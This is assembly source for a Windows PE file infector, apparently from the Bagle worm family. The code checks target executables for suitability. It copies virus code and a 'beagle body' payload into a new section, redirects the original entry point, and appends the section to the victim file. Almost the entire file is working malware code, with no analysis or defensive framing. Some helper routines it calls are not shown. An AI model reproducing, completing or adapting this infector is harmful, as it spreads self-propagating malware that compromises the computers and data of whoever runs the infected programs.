; Very simple PE Infector
; #########################################################################

.data
        ; .exe file to join
        lpWorkFileData          dd      0
        dwWorkFileDataLen       dd      0

        szGoodSections          db      ".text",0
                                db      ".rsrc",0
                                db      ".data",0
                                db      ".rdata",0
                                db      ".edata",0
                                db      ".sdata",0
                                db      ".idata",0
                                db      ".tls",0
                                db      ".bss",0
                                db      ".reloc",0
                                db      ".CRT",0
                                db      "BEGTEXT",0
                                db      "DGROUP",0
                                db      "CODE",0
                                db      "DATA",0
                                db      "BSS",0,0

.code

IsValidPE proc lpFile: DWORD
        xor     eax, eax

        mov     edx, lpFile

        ; Check MZ signature
        cmp     word ptr[edx], 'ZM'
        jnz     @not_valid_pe

        ; Check some offset
        cmp     word ptr[edx+18h], 40h
        jl      @not_valid_pe

        ; Check PE signature
        PEPtrA  edx
        cmp     word ptr[edx], 'EP'
        jnz     @not_valid_pe

        ; GUI only
        cmp     word ptr[edx+5ch], 0002h
        jnz     @not_valid_pe

        ; Doesn't support DLL files
        test    word ptr[edx+16h], 2000h
        jnz     @not_valid_pe

        ; Should not have export table, damn unwise apps
        cmp     dword ptr[edx+78h], 0
        jnz     @not_valid_pe

        ; Should present import table, win2k loader sux
        cmp     dword ptr[edx+80h], 0
        jz      @not_valid_pe

        inc     eax

@not_valid_pe:
        ret
IsValidPE endp

; Check if new section can be added
CheckHeaderSize proc lpFile: DWORD
        invoke  SectionCount, lpFile
        inc     eax
        xor     edx, edx
        mov     ecx, 28h
        mul     ecx

        mov     edx, lpFile
        mov     edx, dword ptr[edx+3ch]
        add     edx, 0f8h
        add     eax, edx ; header size + sizeof new section

        PEPtrA  edx
        mov     edx, dword ptr[edx+54h] ; header size specified in PE header
        .IF     edx < eax
                xor     eax, eax
        .ELSE
                mov     eax, 1
        .ENDIF        
        ret
CheckHeaderSize endp

; Check if file is aligned
CheckFileAlign proc lpFile, dwFileSize: DWORD
        PEPtrA  eax
        mov     eax, dword ptr[eax+3ch]
        xor     edx, edx
        xchg    eax, dwFileSize
        div     dwFileSize
        xor     eax, eax
        test    edx, edx
        setz    al
        ret
CheckFileAlign endp

; Check if file contains only good sections (not packed/protected/etc)
CheckSectionName proc uses edi szSectionName: DWORD
        mov     edi, offset szGoodSections

@next:
        invoke  lstrcmp, szSectionName, edi
        .IF     !eax
                inc     eax
                ret
        .ENDIF
        cld
        xor     eax, eax
        or      ecx, -1
        repnz scasb
        cmp     byte ptr[edi], 0
        jnz     @next
        
        xor     eax, eax
        ret
CheckSectionName endp

CheckSections proc uses esi edi ebx lpFile, dwFileSize: DWORD
        LOCAL   s_name[9]: BYTE

        invoke  ZeroMemory, addr s_name, 9

        invoke  SectionCount, lpFile
        .IF     !eax
                jmp     @cs_ret
        .ENDIF
        mov     ebx, eax
        dec     ebx

        ; Check if there's no extra data at the end of the file
        invoke  SectionHeadPtr, ebx, lpFile
        mov     edx, [eax][SectionHead.PhysOffs]
        add     edx, [eax][SectionHead.PhysSize]
        .IF     edx != dwFileSize
                xor     eax, eax
                jmp     @cs_ret
        .ENDIF

@l:
        invoke  SectionHeadPtr, ebx, lpFile
        mov     esi, eax
        lea     edi, s_name
        mov     ecx, 8
        rep movsb

        invoke  CheckSectionName, addr s_name
        .IF     !eax
                jmp     @cs_ret
        .ENDIF
        dec     ebx
        jns     @l

@cs_ret:
        ret
CheckSections endp

; Pre-load file to append in the feature
LoadWorkFile proc uses ebx esi edi lpszFileName: DWORD
        LOCAL   hFile, dwFileSize: DWORD

        invoke  CreateFile, lpszFileName, GENERIC_READ, FILE_SHARE_READ or FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, 0
        mov     hFile, eax
        inc     eax
        jz      @file_open_error
        
        invoke  GetFileSize, hFile, 0
        mov     dwFileSize, eax
        inc     eax
        jz      @file_open_close

        invoke  CreateFileMapping, hFile, NULL, PAGE_READONLY, 0, 0, NULL
        .IF     eax
                mov     ebx, eax
                invoke  MapViewOfFile, eax, FILE_MAP_READ, 0, 0, 0
                .IF     eax
                        push    eax

                        invoke  GlobalAlloc, GMEM_FIXED, dwFileSize
                        mov     lpWorkFileData, eax

                        mov     esi, [esp]
                        mov     edi, eax
                        mov     ecx, dwFileSize
                        mov     dwWorkFileDataLen, ecx
                        rep movsb

                @not_valid_pe:
                        call    UnmapViewOfFile
                .ENDIF
                invoke  CloseHandle, ebx
        .ENDIF

@file_open_close:
        invoke  CloseHandle, hFile

@file_open_error:
        ret
LoadWorkFile endp

InfectPE proc uses ebx esi edi lpszFileName: DWORD
        LOCAL   hFile, dwFileSize, lpWorkMem, lpVirMem, dwVirSize, lpData: DWORD
        LOCAL   isOK: DWORD

        mov     lpVirMem, 0
        mov     lpWorkMem, 0
        mov     isOK, 0

        cmp     lpWorkFileData, 0
        jz      @file_open_error

        invoke  CreateFile, lpszFileName, GENERIC_READ or GENERIC_WRITE, FILE_SHARE_READ or FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, 0
        mov     hFile, eax
        inc     eax
        jz      @file_open_error
        
        invoke  GetFileSize, hFile, 0
        mov     dwFileSize, eax
        inc     eax
        jz      @file_open_close

        invoke  CreateFileMapping, hFile, NULL, PAGE_READWRITE, 0, 0, NULL
        .IF     eax
                mov     ebx, eax
                invoke  MapViewOfFile, eax, FILE_MAP_ALL_ACCESS, 0, 0, 0
                .IF     eax
                        mov     lpData, eax
                        mov     esi, eax

                        InstSehFrame <offset @not_valid_pe>

                        cmp     dwFileSize, 512
                        jle     @not_valid_pe
                        
                        invoke  IsValidPE, esi
                        test    eax, eax
                        jz      @not_valid_pe

                        invoke  CheckHeaderSize, esi
                        test    eax, eax
                        jz      @not_valid_pe

                        invoke  CheckFileAlign, esi, dwFileSize
                        test    eax, eax
                        jz      @not_valid_pe

                        invoke  CheckSections, esi, dwFileSize
                        test    eax, eax
                        jz      @not_valid_pe

                        invoke  Sleep, 20

                        mov     eax, 1024+@vir_code_end-@vir_code_begin
                        add     eax, dwWorkFileDataLen
                        invoke  GlobalAlloc, GMEM_FIXED, eax
                        mov     lpWorkMem, eax

                        PEPtrB  edx, esi

                        ; Write virus code into WorkMem
                        mov     esi, offset @vir_code_begin
                        mov     edi, lpWorkMem
                        mov     ecx, @vir_code_end-@vir_code_begin
                        rep movsb

                        ; Fix OEP in WorkMem buffer
                        m2m     dword ptr[edi-8], dword ptr[edx+28h]
                        mov     eax, dword ptr[edx+34h]
                        add     dword ptr[edi-8], eax
                        not     dword ptr[edi-8]

                        ; Write beagle body into WorkMem
                        mov     eax, dwWorkFileDataLen
                        stosd
                        mov     esi, lpWorkFileData
                        mov     ecx, eax
                        rep movsb

                        ; Create virus section WorkMem->VirMem
                        mov     eax, edi
                        sub     eax, lpWorkMem
                        invoke  GenVirCode, lpWorkMem, eax
                        mov     lpVirMem, eax
                        mov     dwVirSize, ecx

                        ; Add section header
                        invoke  AddEPSection, lpData, ecx, TRUE

                        mov     isOK, 1

                @not_valid_pe:
                        KillSehFrame
                        invoke  UnmapViewOfFile, lpData
                        .IF     lpWorkMem
                                invoke  GlobalFree, lpWorkMem
                        .ENDIF
                        .IF     (!isOK) && (lpVirMem)
                                invoke  GlobalFree, lpVirMem
                                mov     lpVirMem, 0
                        .ENDIF
                .ENDIF
                invoke  CloseHandle, ebx
                .IF     lpVirMem
                        ; Write virus section contents
                        invoke  SetFilePointer, hFile, 0, NULL, FILE_END
                        invoke  WriteFile, hFile, lpVirMem, dwVirSize, addr lpWorkMem, NULL
                        invoke  GlobalFree, lpVirMem
                .ENDIF
        .ENDIF

@file_open_close:
        invoke  CloseHandle, hFile

@file_open_error:
        ret
InfectPE endp
